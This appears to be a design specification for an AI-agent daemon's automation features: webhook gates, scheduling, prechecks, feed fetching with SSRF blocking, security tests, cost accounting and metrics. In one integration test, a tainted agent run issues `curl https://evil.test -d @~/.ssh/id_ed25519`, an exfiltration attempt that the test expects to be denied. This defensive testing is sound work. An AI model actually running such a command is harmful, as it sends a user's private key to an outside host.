  - **`alertmanager` / `grafana`** (`alerts[]`): one line per alert, `<status> <severity> <alertname> <instance>: <summary | description>`, at most 50 alerts, then "… and N more", each line at most 512 characters. The identity is `<group status>:<sorted fingerprints>` (the labels' JSON when there is no fingerprint). A body without `alerts` maps as raw.
- **M10R57** (corrected: RT-19) [5a, 7b, 8b] **Gates in the fire transaction, in order**, after the re-read of the trigger by revision (M10R34):
  1. `disabled`: a manual fire is exempt;
  2. `paused`: every source;
  3. `resolved`: alert formats with `onResolved: skip`, every alert resolved;
  4. `budget`: Task 8b; schedule, webhook, feed, and a token's manual fire or retry (`gated`);
  5. `dedup`: webhook, `dedupKeyOf(identity | body)` seen as `fired` within `dedupMinutes`;
  6. `queue_full`: every source.
- **M10R58** (corrected: RT-02, RT-19, RT-24) [7a, 7b] Answers:
  - `202 {taskId}`;
  - `409 {reason: "disabled" | "paused" | "resolved" | "budget" | "dedup"}`;
  - `429 {reason: "rate" | "queue_full" | "backoff" | "changed"}` + `Retry-After` (`changed`: 1 s, the sender retries under the saved config);
  - `401 {error: {code: "unauthenticated"}}`;
  - `404 {error: {code: "not_found"}}` (unknown trigger, or not a webhook trigger);
  - `413 {error: {code: "payload_too_large"}}` (the body, or a rendered prompt over the cap), `400 {error: {code: "bad_request"}}`, `503 {error: {code: "capacity" | "read_only"}}`.
- **M10R59** (corrected: RT-31) [8a, 21] **RRULE subset** (`contracts/src/rrule.ts`, pure, used by the daemon and the editor; Orca's subset plus MINUTELY):
  - `FREQ=MINUTELY;INTERVAL=n` (5 ≤ n ≤ 1440): minutes of the local day divisible by n;
  - `FREQ=HOURLY[;INTERVAL=h][;BYMINUTE=m,…]` (h 1–24, hours of the day divisible by h; up to 12 minutes, default 0);
  - `FREQ=DAILY;BYHOUR=h,…[;BYMINUTE=m]` (up to 24 hours, one minute, default 0);
  - `FREQ=WEEKLY;BYDAY=MO,…;BYHOUR=h,…[;BYMINUTE=m]`.
- **M10R60** (corrected: RT-18) [8a] `nextOccurrence(rule, timeZone, after)`: the smallest instant after `after` whose wall clock in the zone matches.
  - Wall time is converted to an instant with `Intl.DateTimeFormat` offsets (two passes).
  - A wall time that does not exist (spring forward) fires at the first instant after the gap.
  - A wall time that exists twice (fall back): `MINUTELY` and `HOURLY` rules fire at **both** instants, as cron does (a whole hour of a sub-daily schedule is never dropped on the last Sunday of October); `DAILY` and `WEEKLY` fire once, at the earlier instant.
  - A search is bounded (8 days of candidates); none found → `null` (never for a valid rule).
- **M10R61** (corrected: RT-07, RT-18, RT-19) [8a] **Scheduler:** one guarded Clock timer (M10R150; none in read-only mode) for the earliest `next_fire_at` among enabled schedule and feed triggers. When it fires, **every** trigger due at that instant is handled from the one tick:
  - a schedule fires through Task 9's precheck, then `fire(triggerId, revision, …)` with the revision it read (a trigger saved or disabled meanwhile gives `changed`, M10R34);
  - a feed enqueues `feed.poll` (Task 10).
- **M10R62** [8a] **Missed fires at boot** (C §6.3), and at run time per M10R61: a `next_fire_at` more than 2 minutes in the past is missed.
  - `catchUp: skip`: one journal line `missed` with the number of occurrences skipped, then the next from now.
  - `catchUp: once`: fire once now (detail "catch-up") when the last missed occurrence is within 12 h, else as `skip`.
- **M10R63** (corrected: RT-04, RT-33, owner m10q5) [8b] **Manual fire** `automation.fire {triggerId, payload?: string ≤ 64 KiB}` (`automation:operate`, mutation):
  - It fires the saved trigger (not the editor's unsaved state), even when disabled.
  - A given payload is fenced as the trigger's source would fence it (`webhook` for a webhook trigger, else `manual`), so a test fire takes the real path and starts tainted. No payload: a schedule or feed trigger renders `{{payload}}` empty.
  - The budget gate applies to a token's fire (`gated`: scripts are automation) and not to a browser session's (the owner's action, `gated = 0`); both are counted in today's spend (owner m10q5). Pause applies to both.
  - The precheck runs first (Task 9).
  - Result: `{verdict: "fired", taskId} | {verdict: "precheck" | "error", detail}` (a precheck skip is an answer, not an error). Refusals: `automation_paused`, `budget_reached`, and `rate_limited` for a full queue ("Too many attempts. Try again later.": the queue cap is a throttle on one trigger; `limit_reached`'s "This list is full" and `queue_full`'s session copy would mislead).
- **M10R64** (corrected: RT-05, RT-13, RT-26, RT-32) [8b, 9, 21] **Dry-run** `automation.dryRun {triggerId?, draft?: TriggerInput, payload?: string}` (`automation:operate`, idempotent): no write, no effect, no session, no tokens, **no fetch** (a feed trigger's dry-run uses the sample payload; M7's final review M2 forbids token-driven outbound requests). Answer `DryRunResult`:
  - `verdict: "fire" | "skip"` and `reasons[]` (each gate as it stands now, `invalid_cwd`, a precheck verdict);
  - `tools`, `profile {preset, mode, tainted, editsUnasked}` (`editsUnasked`: `auto-accept-edits` with `edit` or `write` listed, shown "edits in this folder run unasked"), `cwd`;
  - `prompt`: the exact text with fresh fence ids;
  - `precheck`: `{verdict, exitCode, durationMs, output}` | `"not_run_unsaved"` | `"not_run_token"` | null;
  - `budget {spentUsd, budgetUsd}`, `tokens: "none"`, `feed: "not_fetched"` for a feed trigger.
- **M10R65** [8b] **Journal** `automation.journal {triggerId, before?}` (`automation:read`) → `{entries: FireView[] (50), hasMore}`. `FireView`:
  - `{id, firstAt, at, count, source, verdict, detail}`;
  - `{taskId, taskState, durationMs, costUsd}`, joined from `tasks` and `runs`.
- **M10R66** (corrected: RT-04, RT-08, owner m10q5, m10a1) [8b, 5a, 5b, 12] **Budget gate:**
  - the global `dailyBudgetUsd` (settings, default 5) against `RunsPort.spentToday(owner, timeZone)`: every run whose `task_id` is set (any trigger, manual or retry fire, the browser's included) plus every `resume` run, **finished or in progress** (the live cost of open runs);
  - and the trigger's own `dailyBudgetUsd` against the cost today of the runs of its tasks, live included.
  - Reached → `budget`. The day is the automation time zone's (settings, else the server's).
  - It is checked at fire time for gated fires, again when a queued gated task starts (a task admitted before midnight but started after a full day → `failed` `budget`, pi-web `failOverBudgetTriggerTasks`; one line in Task 5a's admission), and across the run by Task 5b.
- **M10R67** [8b] The `tasks` stream snapshot carries `budgetUsd`, `todayUsd` (live included) and `quietHours` (`inQuietHours`). The board shows a quiet-hours chip; runs still execute (C §6.4). Cost if wrong: none.
- **M10R68** [9] The precheck runs for schedule, feed and manual fires, and in a browser's dry-run of the saved command in its saved folder (M10R64). It never runs for a webhook: the 202 must answer within the sender's timeout, and a delivery is its own reason to run. Cost if wrong: a webhook trigger's precheck ignored (the editor says so under the field).
- **M10R69** (corrected: RT-20, agreements 8, 9) [9] **Spawn** (binding `precheck.ts`):
  - `/bin/sh -c <the owner's command>`; never text from a payload, a feed or a template in the command;
  - cwd = the trigger's folder, resolved again;
  - `env` = `precheckEnv(process.env, trigger.execution.env)`, that is `unattendedEnv(process.env, { keep: [...NETWORK_ENV, ...TOOLING_ENV, ...trigger.execution.env] })` (M10R151);
  - a process group of its own (`detached`), tracked by the kernel: `trackGroup(pid)` at spawn, `signalGroup` for the ladder, `releaseGroup` when it ends, so `killAllWorkerGroups()` at stop and the `exit` hook reach a running precheck;
  - M8's masked stdio (`maskedStdio`, MC38: no PTY master in the child); stdin closed; stdout and stderr each tailed to 4 KiB;
  - 30 s, then SIGTERM to the group, 2 s, SIGKILL; the same ladder when the caller's `signal` aborts (the `feed.poll` deadline, `automation.stop()`);
  - at exit the group is SIGKILLed (jobs left with `&`), and the output is taken after a 2 s grace if a job outside the group still holds a pipe;
  - in a systemd scope when scopes are on: `scopes.next({ kind: "terminal" })` (the terminal limits; no new scope kind, `scope.ts` untouched, agreement 9), reaped after the exit.
- **M10R70** [9] Verdicts:
  - exit 0 → fire, with stdout as `{{precheck}}` (fenced as `precheck`, so the run starts tainted);
  - exit 1 → journal `precheck` with the first non-empty line of the output, stripped of controls and format characters, at most 120 code points (collapsed);
  - any other exit, a signal, the timeout, an abort or a spawn failure → journal `error` with a fixed detail (`precheck exit <n>`, `precheck timeout`, `precheck signal`, `precheck aborted`, `precheck spawn`).
- **M10R71** (corrected: RT-18) [9] **Bounds:** one precheck per trigger at a time (a tick while it runs → journal `error` "precheck busy"); at most 2 running in the daemon. Waiting: scheduler-origin prechecks (schedules, feeds) queue without a refusal, which their trigger count already bounds (one each); manual and token prechecks refuse past 8 waiting (`error` "precheck busy"). Refused, never evicted. Cost if wrong: scheduled fires dropped at :00, or a precheck storm.
- **M10R72** [9] **Residual (named in `automation.md`):** without systemd scopes, a job started with `setsid` leaves the group and survives the kill; with scopes, the reap ends it. The precheck runs as the owner with no sandbox before M11 (bwrap): it is the owner's own command, saved with the step-up. Cost if wrong: none (documented).
- **M10R73** (corrected: RT-06, RT-07) [10] A feed trigger is polled every `everyMinutes` (15–1440, default 360) by the scheduler, as a `feed.poll` effect (replay-safe, receipt `feed:<trigger>:<due time>`, deadline 60 s). The handler fetches (10 s), parses, keeps the new entries, runs the precheck (Task 9, scheduler-origin queue), then calls `fire(triggerId, revision, …)` with the revision it read. The effect's `signal` goes to both the fetch (the socket destroyed) and the precheck (its kill ladder), so the handler always returns before its deadline plus a few seconds and settles on its own result; a fetch or precheck cut by the signal is `retry("deadline")` with the entries not marked seen. A disabled or deleted trigger is never fetched (zero telemetry); a dry-run never fetches (M10R64); nothing is fetched in read-only mode. Cost if wrong: a poll storm, a poll the owner did not ask for, or a zombie poll.
- **M10R74** [10] **The fetch** (binding `net-guard.ts`, used by `feed-fetch.ts`):
  - https only, no credentials;
  - a literal non-public address is refused before connecting (no lookup runs for a literal);
  - every name goes through the `lookup` given to `https.request`, so the socket connects to an address the guard saw (no rebinding window), and one non-public address among the answers refuses the name;
  - refused ranges: private, loopback, link-local (cloud metadata), CGNAT and Tailscale, multicast, reserved, NAT64, 6to4, Teredo, ULA, documentation, and the IPv4-compatible (`::/96`) and IPv4-translated (`::ffff:0:0:0/96`) forms that embed an IPv4 address (RT-26: `https://[::127.0.0.1]/` and `::a9fe:a9fe` passed before). IPv4-mapped IPv6 (`::ffff:a.b.c.d`) is judged by the IPv4 rules (Node's `BlockList`; no IPv6 rule may cover it, it would match every IPv4 address — tested);
  - redirects (301, 302, 303, 307, 308) are judged again, at most 5;
  - one 10 s deadline for the whole chain (Clock), 1 MiB counted as it streams;
  - `agent: false`, `Accept-Encoding: identity`, `User-Agent: pap-feed`, no cookie; TLS verified by Node's defaults.
- **M10R75** [10] **The parser** (`feed-parse.ts`, no XML library, none in the dependencies):
  - RSS 2.0 `<item>` and Atom `<entry>`; title, link (Atom `<link href>`: `rel="alternate"`, else the first), id or guid, published, updated or pubDate, summary or description;
  - the five XML entities and numeric references only; CDATA kept; tags stripped from summaries;
  - `<!DOCTYPE` or `<!ENTITY` anywhere → `not_a_feed` (nothing is ever expanded);
  - the first 100 entries; fields cut (title 300, summary 1 KiB).
- **M10R76** [10] **New entries:**
  - key = sha256 of the id, else the link, else the title; kept in `feed_seen` (at most 1 000 per trigger, the oldest dropped: only the first 100 entries are read, so a dropped key is never seen again);
  - the **first** successful poll after a trigger is created or its URL changes marks every entry seen and fires nothing (journal `dedup`, "first poll · N entries");
  - then the newest new entries, at most 10 per task; more than 10 → the 10 newest fire and the rest are marked seen (detail "N more skipped");
  - the payload is each entry as `title`, `link`, `date`, `summary` lines, blank-line separated, fenced as `feed`; `detail` is the first title.
- **M10R77** [10] **Tests reach no network:** `feed-fetch` takes `{resolve, allowed, request, ca}`. The int test runs a local HTTPS server with the test certificate (`testing/self-signed.ts`) and a resolver that maps `feed.test` to 127.0.0.1 with `allowed` set to loopback, a test-only argument that production never passes. Logs: `feed_fetch {triggerId, status, bytes, durationMs, code}`, never the URL's path or the body. Cost if wrong: none.
- **M10R78** [11] `security/webhook.int.test.ts` (C §8.1, the full daemon over HTTP):
  - **bad secret:** 401, no task, the journal's `unauthorized` count goes up;
  - **bad HMAC** in `hmac`: 401; `auth: "secret+hmac"` is refused at create (owner m10a5);
  - **64 KB + 1:** 413 with a declared length, and again chunked with no length;
  - **dedup replay:** the same signed body twice within the window → 202, then 409 `dedup`, one task;
  - the hook path works with no Origin and with a foreign Origin, while `POST /auth/login` with that Origin is 403;
  - a cookie sent to the hook is ignored;
  - an unknown or upper-case id → 404;
  - a paused automation → 409 `paused`;
  - 10 bad secrets then the right one → 202 (RT-01);
  - a refusal on a raw socket with a declared 50 MB body → the socket is closed long before the body is sent (RT-02);
  - a read-only daemon (a database stamped by a newer pap) → 503 `read_only`, and the daemon booted with no outbox, scheduler or housekeeping timer.
- **M10R79** (corrected: RT-21, RT-38) [11] `security/automation-crash.int.test.ts` runs the real `main.ts` in a child process (the `main.int.test.ts` pattern): temporary home, scripted provider, scopes off.
  - **(a)** A task whose run waits on an approval (a scripted `bash` call in `supervised`): SIGKILL the daemon, wait for its worker to exit (the parent watchdog), restart on the same home. The task is `interrupted`, its run row `interrupted`, the Pi file holds exactly one user message, and no worker starts for that session.
  - **(b)** A `task.start` held in its handler by the test seam `PAP_TEST_OUTBOX_HOLD=task.start` (honoured only with `PAP_TEST_PROVIDER_SCRIPT`, like the other seams; refused otherwise, M10R80): SIGKILL, restart. The row is `retired`, the task is still `queued`, then it starts once (one session).
  - **(c)** A `run.resume` held before its sent mark: requeued, run once, its receipt refusing a second. The same held after its sent mark (`PAP_TEST_OUTBOX_HOLD=run.resume:sent`): `retired`, and the Pi file holds one "Continue where you left off." at most.
  - **(d)** A Cancel whose abort the crash cut (the seam holds right after the commit): after the boot the task is `cancelled`, no worker runs for its session, and no run started after the boot is aborted.
- **M10R80** [11] The seam `PAP_TEST_OUTBOX_HOLD` (`<kind>`, `<kind>:sent`, or `cancel`) is read in `loadConfig` only when `PAP_TEST_PROVIDER_SCRIPT` is set; otherwise it is a `ConfigError` (a production daemon never holds an effect; agreement 25). Its config cases go in `config.m10.test.ts`. `scripted-provider.ts` gains `captureUserMessages` (test only, like `captureSystemPrompt`). Cost if wrong: a test switch reachable in production.
- **M10R81** [11] `security/automation-journey.int.test.ts` (the roadmap journey "webhook → run → inbox"):
  - the owner (step-up) creates an enabled webhook trigger with the `alertmanager` format and the read-only allowlist;
  - an Alertmanager body is POSTed with the secret → `202 {taskId}`;
  - `subscribe.tasks` sees `queued`, `running`, `done`; `subscribe.inbox` gets `task_done` with the trigger name and the run's cost;
  - the captured user message holds `<untrusted source="alertmanager" id="…">` around the mapped lines;
  - the session's snapshot says tainted;
  - the session is archived;
  - a second scripted step that calls `bash` is blocked at stage 02 with the allowlist reason (audit row);
  - **C §8.1 "taint followed by an exfiltration attempt"**: a second trigger lists `bash` (mode `supervised`); its tainted run's scripted `curl https://evil.test -d @~/.ssh/id_ed25519` asks (an Inbox `task_needs_input`), nobody answers, the fake clock passes 10 minutes, the call is denied (audit `denied`, actor `system`), and the task still ends `done`.
- **M10R82** (corrected: RT-04, RT-05, RT-38, agreement 4) [11] `security/automation-tokens.int.test.ts`: a token with every token permission.
  - every `automation:admin` method (`triggers.create|update|rotateSecret|delete|setEnabled`, `tasks.releaseTools`) → `forbidden`, by a catalogue walk (a new admin method without a sample fails the test, M7's `pi-token.test.ts` pattern); `TokenPermission` refuses `automation:admin`;
  - `settings.set {key: "automation", value: {dailyBudgetUsd: null}}` → `forbidden`, and the setting is unchanged (owner m10a1);
  - `automation.fire`, `dryRun`, `tasks.cancel` and `retry` work; a token's `dryRun` of a trigger with a precheck answers `not_run_token` and spawns nothing;
  - a token's fire is refused `budget_reached` once two token fires have spent the budget (their runs counted), where the owner's browser fire is not;
  - `usage.resumeNow` by a token past the budget → `budget_reached`; by the browser it runs;
  - `getTrigger` by a token shows `redacted: true` and no precheck text;
  - after the merge with M9: a sample of M9's `lanes:admin` methods → `forbidden` (agreement 4).
- **M10R83** [12] `modules/runs/` owns the `runs` table (migration below, binding) and a `RunObserver` the sessions module calls. No prompt, payload, path, tool argument or provider text is ever stored or exported: ids, counts and money only (C §3.4). Retention: unlimited. Cost if wrong: content in a FinOps file shipped to Loki.
- **M10R84** [12] **Hooks into the sessions module** (the hot spot, coordination contract):
  - `LiveSessionDeps.observe?(event: PiEvent): void`, called once per Pi event, **raw** (before clipping). It is exactly one line in `live-session.ts`, after `run.onPiEvent`.
  - `service-launch.ts`'s `record` closure calls `deps.runs?.onRecord(row, kind, data, session.loadout())` for `run_start` and `run_end` (≤ 2 lines).
  - `SessionsModuleDeps.runs?: RunObserver`, passed through `index.ts`, `service-types.ts` and `service.ts` (≤ 3 lines).
  - Every observer call is wrapped: a throw is logged (`runs_observer_failed`, rate-limited) and never reaches the session.
- **M10R85** [12] **Boundaries and usage:**
  - **Start:** `run_start` opens a `running` row. Its origin is the one set by `expectOrigin(sessionId, {origin, taskId})` within the last 5 minutes (consumed; the map holds at most 64 entries and refuses past that), else the record's (`user` | `extension`).
  - **Usage:** each raw `message_end` of role `assistant` adds `usage.input`, `output`, `cacheRead`, `cacheWrite` and `cost.total`, counts a turn, and keeps the `model`, the `provider`, the `stopReason` and the `errorMessage` (cut to 2 KiB, in memory only, for Task 17). Each raw `compaction_end` with a `result.usage` adds that usage too (Pi counts compaction in the session's totals, `docs/session-format.md`; RT-22). Each `tool_execution_start` without `parentToolCallId` counts a tool call.
  - **Not counted (named in `finops.md`):** codemode classifier calls cannot happen (pap creates codemode with `models: false`); a branch summary is made by the owner's `navigate` outside a run; `auto_name` and M9's ✦ Suggest are side calls outside runs (controller C1). The run's cost is the lower bound of the session's, never above it.
  - **End:** `run_end` closes the row:
    - `{aborted: true}` → `cancelled` (`aborted`);
    - `{interrupted}` → `interrupted` (`crash`);
    - a last `stopReason` of `error` → `failed` (`provider`), refined by Task 17 into `limited`;
    - otherwise `completed`.
- **M10R86** [12] **Billing:** `SessionLoadout` gains `billing?: "api" | "subscription"`, set by the worker from `modelRegistry.isUsingOAuth(model)` (pi-host `loadout.ts`, ≤ 3 lines). The run takes the loadout's value at its end, `unknown` without one. **Cost** is Pi's `usage.cost.total`, the list price of the tokens: the provider's cost for an API key, the API-equivalent for a subscription. The UI labels it so (DESIGN §11: "provider cost or API-equivalent, labelled"). Cost if wrong: a subscription shown as money spent.
- **M10R87** (corrected: RT-23) [12] **`logs/runs.jsonl`:** one line per ended run, in this exact shape (`provider` and `model` through `labelValue`, binding below, as `/metrics` does: the file is shipped to Loki):
  - `{v: 1, ts: <ISO end>, id, ownerId, sessionId, taskId, origin, status, startedAt, endedAt, durationMs}`;
  - `{provider, model, billing, tokens: {input, output, cacheRead, cacheWrite}, costUsd, turns, toolCalls, errorClass, limitResetAt}`.
- **M10R88** (corrected: RT-07) [12] **Boot:** `running` rows become `interrupted` (`crash`, `ended_at` = boot), with their JSONL lines, in `composeRuns()` before the sessions module exists; nothing in read-only mode (M10R150). Cost if wrong: runs left open for ever, or no read-only boot.
- **M10R89** (corrected: RT-08, RT-22, agreement 14, controller C1) [12] **`RunsPort`** (exported by `runs/index.ts`):
  - `onRunStart(listener)`, `onRunEnd(listener)` with `RunEndEvent {runId, sessionId, ownerId, taskId, origin, status, costUsd, errorClass, limitResetAt}`;
  - `expectOrigin(sessionId, {origin, taskId})`, `clearExpected(sessionId)`;
  - `markEnding(sessionId, errorClass: "deadline" | "run_budget" | "budget")` (M10R156);
  - `onLiveCost(listener: (sessionId, ownerId, runCostUsd) => void)` after each assistant message and compaction;
  - `spentToday(ownerId, timeZone): number`: the cost today of every run with a `task_id` and every `resume` run, finished runs from the table plus **the live cost of open ones** (owner m10q5); `spentTodayOf(ownerId, timeZone, triggerTaskIds)` for a trigger's own budget;
  - `sessionCost(sessionId): number | null` (agreement 14, C1): synchronous, the sum of the session's `runs.cost_usd` plus the live cost of its open run, null without runs; M9's compare column reads it after the merge;
  - `onResumeSkipped(listener: (sessionId, reason) => void)` (fired by Task 17; Task 5b listens);
  - `summary(ownerId, range, timeZone)`.
- **M10R90** [12] `usage.summary {range: "today" | "7d" | "30d"}` (`usage:read`) answers, with days counted in the automation time zone:
  - `{from, to, timeZone, totals {costUsd, tokens, runs}}`;
  - `byOrigin[]`;
  - `byModel[{provider, model, billing, costUsd, tokens, runs}]`: the top 50, the rest summed as `other`.
- **M10R91** [13] **Tracer:** `tracer.span(name, attrs?)` → `{ end(outcome) }`, one NDJSON line per ended span, `{name, start, durationMs, outcome, attrs}`, to `$PAP_HOME/logs/trace.jsonl` (rotating, 10 MiB × 10, 0600).
  - **Names** are a closed set: `rpc.<method>` (methods of the contracts catalogue only, else `rpc.unknown`), `outbox.<kind>`, `hook`, `fire`, `precheck`, `feed.fetch`, `task.start`, `run`, `scheduler.tick`, `event_loop.stall`.
  - **`outcome`** is `ok`, an error code of `ERROR_CODES`, or `error`.
  - **`attrs`** take closed keys per name (`verdict`, `status`, `origin`, `code`, `bytes`, `count`) with numbers, booleans or closed strings: never an id, a param, a path, a name or a text. A line over 1 KiB is dropped and counted.
- **M10R92** [13] `createDispatcher({ …, onCall?(method, durationMs, outcome) })` (≤ 6 lines in `dispatcher.ts`): the tracer turns each call into an `rpc.<method>` span. Spans are added to the outbox worker (Task 2's file, one line) and to the automation and runs code after JOIN 1 (one line where each already works). Cost if wrong: none.
- **M10R93** (corrected: RT-07) [13] **Stall monitor** (T3's numbers): `monitorEventLoopDelay({ resolution: 1000 })`, sampled every 30 s on the Clock through `guardTimer` (M10R150); the trace file is not written in read-only mode (the counters still run). A sample whose delay max minus 1000 ms exceeds 2000 ms, while active time is at least that, is a stall: a `event_loop_stall {ms}` warning (rate-limited), an `event_loop.stall` span, and the counters Task 14 exposes. The sampler is injected in tests. Cost if wrong: a stall nobody sees.
- **M10R94** [13] **`pap trace summary [--since <15m|2h|1d>]`:** it reads `logs/trace.jsonl` and `.1`–`.9` without the instance lock, so it works while the daemon runs or is stopped. The home is `PAP_HOME` or the default, like `pap serve`.
  - Per span name: count, rate per minute, p50, p90, p99, max (ms), failures; plus the count of skipped lines.
  - A text table on stdout, exit 0; a bad flag exits 64 with the usage; a missing file prints "no trace yet" and exits 0.
  - `USAGE` and `COMMANDS` gain one line each.
- **M10R95** [14] `GET /metrics` is off (404 JSON, like any reserved path) unless `PAP_METRICS_TOKEN` is set (owner m10q12).
  - A set value must match `METRICS_TOKEN` (32–256 of `[A-Za-z0-9._~+/=-]`), else a `ConfigError` at boot that names the variable, never the value.
  - The bearer is compared on SHA-256 digests (binding below). A wrong or missing one → 401 with `WWW-Authenticate: Bearer` and `Cache-Control: no-store`.
  - A cookie or a pap token is never accepted. It is a GET, so the Origin check does not apply.
- **M10R96** (corrected: RT-23) [14] **Families** (Prometheus text 0.0.4, `pap_` prefix):
  - **from the `runs` table** (cached 15 s), so they survive restarts and never go backwards: `pap_runs_total{origin,status}`, `pap_run_tokens_total{kind,provider,model}`, `pap_run_cost_usd_total{provider,model,billing}`, `pap_run_duration_seconds_sum{origin}`, `pap_run_duration_seconds_count{origin}`;
  - **from automation:** `pap_tasks{state}`, `pap_trigger_fires_total{source,verdict}` (an **in-process counter** incremented at each journal write, from 0 at the daemon's start: the journal's own counts fall when the 500-row cut or a trigger deletion runs, and a counter that decreases reads as a reset and spikes `rate()`; the counter is Task 5a's `fire-counts.ts`, and Task 7b registers its family after JOIN 2), `pap_outbox_effects{status}`, `pap_automation_paused`, `pap_budget_spent_usd_today`, `pap_budget_usd`;
  - **from the kernel:** `pap_workers_active`, `pap_workers_max`, `pap_event_loop_stall_seconds_total`, `pap_event_loop_delay_max_seconds`, `pap_otlp_dropped_spans_total`, `process_resident_memory_bytes`, `process_start_time_seconds`.
- **M10R97** (corrected: RT-23) [14] **Labels** (binding `metrics-auth.ts`, and Task 12's `labelValue`):
  - `origin`, `status`, `kind`, `billing`, `state`, `source` and `verdict` come from closed sets;
  - `provider` and `model` go through `labelValue` (Task 12: plain `[A-Za-z0-9._:/@+-]{1,64}` and free of M5's secret formats, else `other`);
  - at most 100 distinct model values, chosen the same way at every scrape: the 100 with the highest cost, ties by value (`topLabels`); the rest read `other`. A first-seen rule rebuilt every 15 s let the 101st model flip in and out of `other`;
  - never a session id, task id, trigger name, owner, path or text.
- **M10R98** [15] **Off by default:** no exporter object exists and no timer runs unless `PAP_OTLP_ENDPOINT` is set.
  - **Endpoint:** an `https://` URL, or `http://` to `localhost`, `127.0.0.1` or `[::1]` only (a local collector); anything else is a `ConfigError` at boot.
  - **`PAP_OTLP_HEADERS`:** `name=value` pairs, comma-separated, at most 8; names `[A-Za-z0-9-]{1,64}`, values at most 512 printable ASCII. Values are never logged and never in an error.
  - **`PAP_OTLP_SERVICE_NAME`** defaults to `pap`.
- **M10R99** (corrected: RT-07, RT-20) [15] **What is exported:**
  - **Traces:** the tracer's spans also go to a queue of 2 048 (full → dropped and counted). Every 10 s, up to 512 are POSTed to `<endpoint>/v1/traces`, with resource attributes `service.name` and `service.version` only.
  - **Metrics:** every 60 s, the `/metrics` snapshot goes to `<endpoint>/v1/metrics` (cumulative sums, gauges).
  - **Transport:** a 10 s timeout, no redirect followed, no retry before the next interval. A failure is logged as `otlp_export_failed {signal, status}`, rate-limited.
  - The span attributes are the tracer's closed set (M10R91): nothing else leaves.
  - Its timers run through `guardTimer`, none in read-only mode; at stop, its closer flushes once, at most 2 s (controller C3).
- **M10R100** [16] **Fork cap:** at most 30 forks and clones per owner in any 10 minutes (a sliding window on the Clock, one counter list per owner, bounded by owners). The 31st → `rate_limited`. In `sessions/fork-quota.ts`, called by `fork` and `clone` (≤ 2 lines in `service.ts`). Cost if wrong: a token fills the disk with copies of a transcript.
- **M10R101** (corrected: agreement 13) [16, 5a] **Disk floor** `PAP_MIN_FREE_DISK_MB`: default 1024, `0` turns it off, a negative value or a non-number is a `ConfigError`.
  - `statfs` of Pi's sessions folder, before anything is written: below the floor → `disk_low`.
  - Checked by `fork`, `clone` and `SessionsAutomationPort.createTaskSession` (inside the port, so Task 5a only maps the error).
  - After the merge with M9 (M10 rebases second, owner c1), M10 wires M9's `LanesDeps.diskFloor` in `modules/lanes/compose-lanes.ts` (one line, on the filesystem of `$PAP_HOME/worktrees`): `lanes.create`, each copy and each capture then answer `disk_low`.
  - A `statfs` failure lets the action through and logs once: a guard, not a gate on the unknown.
- **M10R102** (corrected: RT-35) [16] **Attachment cleanup** (binding `attachments-cleanup.ts`): the `attachment.cleanup` handler deletes `$PAP_HOME/attachments/<session id>/` when:
  - the session's last activity is older than 30 days (owner m10q11);
  - or the session has no row (a deleted task session included, M10R155) and the folder's mtime is older than 30 days.
- **M10R103** [17] **Classification** (`runs/limits.ts`, pure). A run whose last `stopReason` is `error` is `limited` when its error text (cut to 2 KiB) matches, case-insensitive:
  - Pi's own non-retryable limit words: `usage limit`, `usage_limit`, `usage_not_included`, `GoUsageLimitError`, `FreeUsageLimitError`, `Monthly usage limit reached`, `insufficient_quota`, `quota exceeded`, `out of budget`, `available balance`, `subscription_sharing_usage_limit_exceeded`;
  - or a final `rate limit` / `rate_limit` (Pi retried and gave up).
- **M10R104** (corrected: owner m10q6) [17] A `limited` run with a reset time, while `autoResume` is on (settings, default on) and the session's effective mode is not `full-access` (owner m10q6: an unattended continuation in `full-access` at 03:00 is what M10 forbids for triggers): one `run.resume` effect, owned by the session's owner.
  - Receipt `resume:<session>:<run>:<resetAt>`. Due at `resetAt` plus a jitter of 0–60 s taken from the session id (no thundering herd at a shared reset).
  - Written with the run's end (the observer's own transaction).
  - Without a reset time, or in `full-access`, nothing is scheduled (`LimitView.resume: "none"`); the chip offers Resume now.
- **M10R105** (corrected: RT-21, owner m10q5, m10q6) [17] **The `run.resume` handler checks, in order:**
  1. the effect was not cancelled (`context.cancelRequested()`, M10R149: a cancel during the lease is seen);
  2. the session exists, is the owner's and is not archived (archived → skip, `onResumeSkipped(session, "archived")`);
  3. no run started in the session since `runId` (new input wins, T3: a newer run → skip `newer_input`);
  4. the session's effective mode is not `full-access` now (the owner may have switched since) → skip `full_access`;
  5. the budget: `spentToday` (live included) below `dailyBudgetUsd`, else skip and `onResumeSkipped(session, "budget")` (Task 5b fails a task `budget`).
- **M10R106** (corrected: RT-04, RT-21) [17] `usage.cancelResume {sessionId}` cancels the effect (`outbox.cancel`: a pending one retired, a leased one marked, M10R149). `usage.resumeNow {sessionId}` runs the same checks now; the budget applies to a token caller (`budget_reached`: a token is not the owner's browser) and not to a browser session; final fix round: a token's continuation also runs under origin `resume` (counted, budget-abortable), only the browser click is `user`. Both are `usage:operate` mutations; another owner's session → `not_found`. Cancelling a task (Task 5a) cancels its resume. Cost if wrong: a cancel lost during the lease, or a token past the budget.
- **M10R107** (corrected: RT-14) [17] **The `usage` stream** (owner-keyed, M10's; the session snapshot is untouched: `streams.ts` and `snapshot.ts` have no room, and the limit is FinOps state).
  - **Snapshot:** `limits[]` (sessions whose latest run is `limited`, at most 200, newest first), `todayUsd`, `budgetUsd`, `autoResume`.
  - **Events:** `limit`, `limit_cleared` (a later run started, or a cancel), `spend` (at most one per 5 s).
  - **`LimitView`:** `{sessionId, runId, resetAt | null, resume: "scheduled" | "cancelled" | "none", provider, model}`.
  - **Web:** `AppShell`'s sign-out cleanup resets the `usage` store (one line, agreement 21).
- **M10R108** (corrected: RT-29, RT-32) [17] **Web:**
  - `LimitChip` and `limit.vm.ts` live in **`features/sessions/`** (a feature imports only its own domain, `eslint.config.js`; RT-29), lazy with the session chunk, mounted by one line in `SessionScreen.tsx`'s header beside the mode chip (decision 80 c3; its actions in a small menu like the session ⋯ menu of decision 80 c1): `RunStatusChip` status `limited` with "Resets 14:30" (or "Limit reached" without a time), and a menu with "Resume now" and "Cancel auto-resume".
  - The session screen subscribes to `usage` while open.
  - `runStatusOf` stops mapping `cold` to `limited`: a cold session reads `settled`.
- **M10R109** [18] `models.usage {providerId}` (`pi:admin`, idempotent; M7's domain and module) answers `{status: "ready", report: UsageReport}` or `{status: "auth_unavailable" | "query_failed" | "unsupported"}`.
